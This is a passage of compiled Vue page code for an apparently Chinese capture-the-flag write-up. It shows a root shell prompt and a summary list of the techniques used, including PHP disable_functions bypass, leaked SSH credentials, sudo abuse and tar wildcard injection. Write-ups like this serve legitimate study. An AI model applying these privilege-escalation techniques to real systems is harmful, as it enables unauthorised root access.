punctuation"}},[a._v("(")]),a._v("mj"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("euid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("root"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("groups")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1001")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("mj"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(",33"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("www-data"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nbash-5.0"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# ")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/maze-111z/25.png",alt:""}})]),a._v(" "),s("p",[a._v("考点总结：")]),a._v(" "),s("ul",[s("li",[a._v("前端验证绕过")]),a._v(" "),s("li",[a._v("php函数名不区分大小写")]),a._v(" "),s("li",[a._v("php 闭合标签允许最后一句不使用分号结束符")]),a._v(" "),s("li",[a._v("php标签之间共享变量")]),a._v(" "),s("li",[a._v("php disable_functions 绕过")]),a._v(" "),s("li",[a._v("ssh 凭证泄露")]),a._v(" "),s("li",[a._v("sudo 权限滥用")]),a._v(" "),s("li",[a._v("tar 通配符注入")])])])}),[],!1,null,null,null);s.default=r.exports}}]);